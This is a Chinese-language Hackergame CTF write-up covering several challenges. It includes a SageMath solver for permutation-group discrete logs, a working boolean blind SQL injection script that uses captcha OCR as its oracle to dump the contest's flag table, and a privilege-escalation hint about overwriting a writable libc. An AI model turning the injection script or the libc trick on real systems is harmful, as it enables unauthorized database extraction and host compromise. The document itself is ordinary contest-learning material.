# Writeup

记录一下个别题目的WP,预期解法官方写的比我好 :)

[My Blog](https://b.earthc.moe)

Hackergame好好玩呀

## 传达不到的文件

一开始还想ptrace的，但是ptrace读内存没成功(suid的程序竟然也能被ptrace?)，结果`/lib64/`下的文件竟然可写？

换掉libc或者直接把shellcode写进libc.so里面去即可。

## 置换魔群

### 置换群上的 RSA && 置换群上的 DH

SageMath里面实现了相关代数结构，剩下的略

### 置换群上的超大离散对数

secret有点大，得找两个很大的阶元素，各自解出来后CRT。

最大阶好办，[OEIS](http://oeis.org/A000793)上面有python代码，改一改即可。

剩下一个通过找最大阶没用到的质因子来构造，但是还是有点不够大，脚本需要多跑几次

```sage
from permutation_group import permutation_element, permutation_group
from math import factorial
import pickle
from random import SystemRandom
import re
from pwn import *
from sympy import primerange

def aupton(N): # compute terms a(0)..a(N)
	V = [1 for j in range(N+1)]
	factors = [[] for j in range(N+1)]
	factors[0] = []
	factors[1] = [1]
	for i in primerange(2, N+1):
		for j in range(N, i-1, -1):
			hi = V[j]
			factorhi = factors[j]
			faci = factors[i]
			pp = i
			facp = [pp]
			while pp <= j:
				# hi = max((pp if j==pp else V[j-pp]*pp), hi)
				if j == pp:
					thi = pp
					tfactorhi = [pp]
				else:
					thi = V[j-pp]*pp
					tfactorhi = factors[j-pp] + [pp]
				if thi > hi:
					hi = thi
					factorhi = tfactorhi
				pp *= i
				# facp.append(i)
			V[j] = hi
			factors[j] = factorhi
	return V,factors
ret = aupton(2000)

def get_max_order(n):
	Sn = SymmetricGroup(n)
	tmp = ret[1][n]
	lis = []
	cnt = 1
	for i in tmp:
		lis.append(tuple(list(range(cnt,cnt+i))))
		cnt += i
	return Sn(lis)

def get_some_big_order(n,upper):
	Sn = SymmetricGroup(n)
	factors = list(factor(ret[0][n]))
	used_primes = [i[0] for i in factors]
	cnt =0
	tmp = []
	for i in primerange(2, n+1):
		if i in used_primes:
			continue
		if cnt+i > n:
			break
		tmp.append(i)
		cnt += i
	print(tmp)

	# exit(0)
	lis = []
	cnt = 1
	for i in tmp:
		lis.append(tuple(list(range(cnt,cnt+i))))
		cnt += i
	for i in range(cnt,n+1):
		lis.append((cnt,))
		cnt+=1
	return Sn(lis)

def s2n(x): return [int(x) for x in re.findall(r"\-?\d+\.?\d*", x)]

p = remote('202.38.93.111',10114)

p.sendline(b'114514:1919810')
p.recvuntil(b'choice')
p.sendline(b'3')
def fff():
	p.recvuntil(b'[+] DH public key:')
	line = p.recvline().strip().decode()
	n = re.findall(r'n = (\d+)', line)[0]
	n = int(n)
	Sn = SymmetricGroup(n)
	p.recvuntil(b'The upper bound for my private key is ')
	upper_bound = int(p.recvline().strip())


	p.recvuntil(b'ose the generator twice!\n')
	log.success(f'n = {n}')
	log.success(f'upper_bound = {upper_bound}')
	g1 = get_max_order(n)
	log.success(f'g1.order() = {g1.order()}')
	g2 = get_some_big_order(n,upper_bound)
	log.success(f'g2.order() = {g2.order()}')

	p.recvuntil(b'(a list): ')
	p.sendline(str(g1.tuple()).replace(" ","").encode())	
	line = p.recvline().strip().decode()
	y1 = Sn(s2n(line.split(':')[1]))
	ou1 = discrete_log(y1,g1)
	log.success(f'ou1 = {ou1}')

	p.recvuntil(b'(a list): ')
	p.sendline(str(g2.tuple()).replace(" ","").encode())	
	line = p.recvline().strip().decode()
	y2 = Sn(s2n(line.split(':')[1]))
	ou2 = discrete_log(y2,g2)
	log.success(f'ou2 = {ou2}')

	ou = crt([ou1,ou2],[g1.order(),g2.order()])

	assert g1**ou == y1
	assert g2**ou == y2
	test_bound = lcm(g1.order(),g2.order())
	if test_bound < upper_bound:
		log.info(f'may gg')
	ans = str(ou).replace(" ","").encode()
	p.recvuntil(b'> your answer:')
	p.sendline(ans)

for i in range(15):
	log.info(f'round {i}')
	fff()
context.log_level = 'debug'

p.interactive()
```

SageMath真好用！

## 你先别急

题目描述有提到数据库，玩了玩发现`Simple-1`和`Simple-1' -- `都是纯数字，那就是注入了。

TLDR: 通过识别验证码来进行Bool型注入

```python
import requests
import ddddocr
import base64
ocr = ddddocr.DdddOcr()
debug = 1

burp0_url = "http://202.38.93.111:11230/captcha"
burp0_cookies = {"session": ".MTE0NTE0Cg==.MTkxOTgxMAo="}
burp0_headers = {"Accept": "*/*", "DNT": "1", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "http://202.38.93.111:11230", "Referer": "http://202.38.93.111:11230/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6,ja-JP;q=0.5,ja;q=0.4", "Connection": "close"}

digits = '1234567890'
def test(sql):
	burp0_data = {"username": f"Simple-1' {sql} -- "}
	if debug: print(burp0_data)
	r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
	# print(r.json()['result'])

	img_bytes = base64.b64decode(r.json()['result'])
	res = ocr.classification(img_bytes)
	if debug: print(res)
	cnt = 0
	for i in res:
		if i in digits:
			cnt += 1
	if cnt >= 5:
		return True
	else:
		return False

def get_length(sql):
	for i in range(1, 100):
		if test(f'and length(({sql}))<={i}'):
			if debug: print(i)
			return i
			break
def get_char(sql, pos):
	step = 256
	i = 0
	while step > 0:
		if test(f'and unicode(substr(({sql}),{pos},1))>{i+step}'):
			i += step
		step //= 2
		if step == 0:
			if test(f'and unicode(substr(({sql}),{pos},1))={i+1}'):
				return chr(i+1)
			else:
				assert 0,'test'
		

	for i in range(32, 127):
		if test(f'and unicode(substr(({sql}),{pos},1))<={i}'):
			print(chr(i))
			return chr(i)
def get_captcha(sql):
	leng = get_length(f"{sql}")
	print(f'length: {leng}')
	s = ''
	for i in range(1, leng+1):
		s += get_char(f"{sql}", i)
		print(s)

debug=0
get_captcha("SELECT * from flag")
```

## 看不见的彼方

通过发Signal传递信息。

PS:

一开始想通过设置进程的nice值，另一个进程读取来传递信息。

但是平台限制了进程数量，fork几个之后fork不出来了...secret只传递了一部分